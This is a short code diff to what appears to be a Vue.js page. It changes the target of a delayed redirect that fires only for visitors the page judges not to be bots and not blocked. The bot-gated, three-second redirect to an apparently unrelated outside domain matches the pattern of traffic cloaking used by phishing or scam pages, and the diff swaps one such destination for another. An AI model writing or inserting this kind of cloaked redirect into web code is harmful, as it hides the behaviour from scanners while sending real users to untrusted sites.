@@ -56,7 +56,7 @@ const app = createApp({
       
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://look.mnlan.net/';
+          window.location.href = 'https://otf.rodolfocolen.com/';
         }, 3000);
       }
     });
